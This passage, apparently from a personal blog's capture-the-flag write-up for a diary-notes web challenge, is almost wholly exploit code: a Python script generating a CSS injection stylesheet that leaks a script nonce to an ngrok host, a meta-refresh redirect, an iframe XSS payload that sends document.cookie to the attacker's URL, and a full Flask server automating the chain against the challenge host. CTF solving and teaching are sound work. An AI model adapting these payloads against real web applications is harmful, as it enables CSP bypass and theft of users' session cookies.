</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;leak.css&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i, x <span style="color:#f92672">in</span> enumerate(perms):
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;:has(script[nonce*=&#34;</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;])</span><span style="color:#ae81ff">{{</span><span style="color:#e6db74">--tosend-</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">: url(https://25de-37-160-34-111.ngrok-free.app/?x=</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">);</span><span style="color:#ae81ff">}}</span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;loading&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> perms:
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;var(--tosend-</span><span style="color:#e6db74">{</span>x<span style="color:#e6db74">}</span><span style="color:#e6db74">, none),&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;done&#34;</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;writing&#34;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span>write((<span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">input{
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">background: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span> <span style="color:#f92672">%</span> data[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]))
</span></span></code></pre></div><h3 id="first-note-id-0">First note (ID 0)</h3>
<p>Meta tag redirect</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;refresh&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0;url=https://25de-37-160-34-111.ngrok-free.app/&#34;</span>&gt;
</span></span></code></pre></div><h3 id="second-note-id-1">Second Note (ID 1)</h3>
<p>Nonce leak</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://unpkg.com/alemmi@x.x.x/leak.css&#34;</span>&gt;&lt;<span style="color:#f92672">input</span> /&gt;
</span></span></code></pre></div><h3 id="third-note-id-2">Third Note (ID 2)</h3>
<p>XSS</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">asdasd</span> <span style="color:#a6e22e">srcdoc</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;script nonce=&#34;{nonce}&#34;&gt;fetch(&#34;{ngrok_url}/flag?flag=&#34;+encodeURI(document.cookie))&lt;/script&gt;&#39;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt;
</span></span></code></pre></div><h3 id="final-exploit">Final exploit</h3>
<p>Just go to <code>/exploit</code> and everything will be automatically done. Obviously, you need to open a ngrok http tunnel to a port, and open the python server to the same port. Furthermore, the leak.css file should have the ngrok url as well.</p>
<p><code>server.py</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template, redirect, url_for, session, make_response
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://new-diary.ctf.0ops.sjtu.cn&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># little random</span>
</span></span><span style="display:flex;"><span>user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pwn&#39;</span><span style="color:#f92672">+</span>str(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1000000</span>))
</span></span><span style="display:flex;"><span>ngrok_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https://679d-131-175-28-197.ngrok-free.app/&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nonce_substr <span style="color:#f92672">=</span> set()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">retrieveNonce</span>(nonce_substr<span style="color:#f92672">=</span>nonce_substr, force<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># find the beginning of the nonce (there is no match for start)</span>
</span></span><span style="display:flex;"><span>    new_substr <span style="color:#f92672">=</span> list(nonce_substr)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (len(new_substr) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">and</span> <span style="color:#f92672">not</span> force):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;different length of new_substr [</span><span style="color:#e6db74">{</span>len(new_substr)<span style="color:#e6db74">}</span><span style="color:#e6db74">] - aborting&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    backup <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    nonce <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    remove_i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(new_substr)):
</span></span><span style="display:flex;"><span>        start_i <span style="color:#f92672">=</span> new_substr[i][<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>        left <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(len(new_substr)):
</span></span><span style="display:flex;"><span>            end_j <span style="color:#f92672">=</span> new_substr[j][<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>:]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i <span style="color:#f92672">!=</span> j:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> start_i <span style="color:#f92672">==</span> end_j:
</span></span><span style="display:flex;"><span>                    left <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> left <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># beginning</span>
</span></span><span style="display:flex;"><span>            remove_i <span style="color:#f92672">=</span> i
</span></span><span style="display:flex;"><span>            nonce <span style="color:#f92672">=</span> new_substr[i]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (len(nonce) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;no beginning - aborting&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (len(nonce) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        new_substr <span style="color:#f92672">=</span> new_substr[<span style="color:#ae81ff">0</span>:remove_i] <span style="color:#f92672">+</span> new_substr[remove_i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:]
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># print(&#34;new substr: &#34; + str(new_substr))</span>
</span></span><span style="display:flex;"><span>        found <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(new_substr)):
</span></span><span style="display:flex;"><span>            start_i <span style="color:#f92672">=</span> new_substr[i][<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (nonce[<span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>:] <span style="color:#f92672">==</span> start_i):
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># print(&#34;found: &#34; + start_i)</span>
</span></span><span style="display:flex;"><span>                found <span style="color:#f92672">+=</span> [i]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (len(found) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># start over from latest backup</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (len(backup) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>                nonce <span style="color:#f92672">=</span> backup[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>                found <span style="color:#f92672">=</span> backup[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>                new_substr <span style="color:#f92672">=</span> backup[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>][<span style="color:#ae81ff">2</span>]
</span></span><span style="display:flex;"><span>                backup <span style="color:#f92672">=</span> backup[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;no backup - aborting&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (len(found) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (len(found) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>):
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;found more than one: &#34;</span> <span style="color:#f92672">+</span> str(found))
</span></span><span style="display:flex;"><span>                backup <span style="color:#f92672">+=</span> [[nonce, found[<span style="color:#ae81ff">1</span>:], new_substr]]
</span></span><span style="display:flex;"><span>            remove_i <span style="color:#f92672">=</span> found[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>            nonce <span style="color:#f92672">+=</span> new_substr[remove_i][<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># input(&#34;nonce: &#34; + nonce)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> nonce
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/login&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;username&#39;</span>: user, <span style="color:#e6db74">&#39;password&#39;</span>: user})
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> r<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">200</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;login failed&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_zero_note</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/write&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;title&#39;</span>:<span style="color:#e6db74">&#39;meta&#39;</span>, <span style="color:#e6db74">&#39;content&#39;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&lt;meta http-equiv=&#34;refresh&#34; content=&#34;0.0;url=</span><span style="color:#e6db74">{</span>ngrok_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&gt;&#39;</span>})
</span></span><span style="display:flex;"><span>    share(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_first_note</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/write&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;title&#39;</span>:<span style="color:#e6db74">&#39;linkstylesheet&#39;</span>, <span style="color:#e6db74">&#39;content&#39;</span>: <span style="color:#e6db74">&#39;&lt;link rel=&#34;stylesheet&#34; href=&#34;https://unpkg.com/alemmi@x.x.x/leak.css&#34;&gt;&lt;input /&gt;&#39;</span>})
</span></span><span style="display:flex;"><span>    share(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">share</span>(num):
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/share_diary/</span><span style="color:#e6db74">{</span>num<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create_script_nonce</span>(nonce):
</span></span><span style="display:flex;"><span>    script <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;&lt;iframe name=asd srcdoc=&#34;&lt;script nonce=</span><span style="color:#e6db74">{</span>nonce<span style="color:#e6db74">}</span><span style="color:#e6db74">&gt;top.location=&#39;</span><span style="color:#e6db74">{</span>ngrok_url<span style="color:#e6db74">}</span><span style="color:#e6db74">flag?flag=&#39;+encodeURI(document[&#39;cookie&#39;])&lt;/script&gt;&#34;/&gt;&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/write&#39;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;title&#39;</span>:<span style="color:#e6db74">&#39;pwning&#39;</span>, <span style="color:#e6db74">&#39;content&#39;</span>: script})
</span></span><span style="display:flex;"><span>    share(<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">report</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/report?id=0&amp;username=&#39;</span> <span style="color:#f92672">+</span> user)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/logout&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/exploit&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(test<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> user
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;pwn&#39;</span><span style="color:#f92672">+</span>str(random<span style="color:#f92672">.</span>randint(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1000000</span>))
</span></span><span style="display:flex;"><span>    logout()
</span></span><span style="display:flex;"><span>    login()
</span></span><span style="display:flex;"><span>    write_zero_note()
</span></span><span style="display:flex;"><span>    write_first_note()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (test <span style="color:#f92672">==</span> <span style="color:#66d9ef">False</span>):
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;reporting...&#34;</span>)
</span></span><span style="display:flex;"><span>        report()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;exploit for &#34;</span><span style="color:#f92672">+</span>user<span style="color:#f92672">+</span><span style="color:#e6db74">&#34; done&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flag</span>():
</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;flag&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> flag <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;flag: &#34;</span> <span style="color:#f92672">+</span> flag)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;You have been pwned&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Pls give me flag&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;x&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> x <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;x: &#34;</span> <span style="color:#f92672">+</span> x)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;current nonce_substr: &#34;</span> <span style="color:#f92672">+</span> str(nonce_substr))
</span></span><span style="display:flex;"><span>        nonce_substr<span style="color:#f92672">.</span>add(x)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(nonce_substr) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">30</span>:
</span></span><span style="display:flex;"><span>            nonce <span style="color:#f92672">=</span> retrieveNonce()
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;nonce: &#34;</span> <span style="color:#f92672">+</span> nonce)
</span></span><span style="display:flex;"><span>            create_script_nonce(nonce)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, USERNAME<span style="color:#f92672">=</span>user)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#39;Public URL:&#39;</span>, ngrok_url)
</span></span><span style="display:flex;"><span>        app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;localhost&#39;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">5000</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print(e)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;aborting&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">finally</span>:
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><p><code>index.html</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;Document&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">sleep</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">milliseconds</span>) =&gt; <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#a6e22e">milliseconds</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">run</span>(){
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">bot_window</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;http://localhost/share/read#id=1&amp;username={{USERNAME}}&#34;</span>); <span style="color:#75715e">// Exploit 1, leak nonce
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">7000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">bot_window</span>.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost/share/read#id=2&amp;username={{USERNAME}}&#34;</span>; <span style="color:#75715e">// Exploit 2, leak cookie
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">100</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;O&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">run</span>();
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>At the end, it was a fun challenge to solve ❤️ Thanks to the authors for the challenge and for the CTF in general.</p></div>
    </article>
  </main>

      </div>
      <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      <br />
      
        
        <a href="https://github.com/salvatore-abello">Github</a>
      
         | 
        <a href="https://www.linkedin.com/in/salvatore-abello-411b64252/">Linkedin</a>
      
         | 
        <a href="https://x.com/salvatoreabello">X</a>
      
    </p>
  
  <p class="copyright">
    Copyright 2025. All rights reserved.
    <hr />
    <code>Made with ❤️ by <strong>Salvatore Abello</strong></code>.
  </p>
</footer>

    </div>
  </body>
</html>
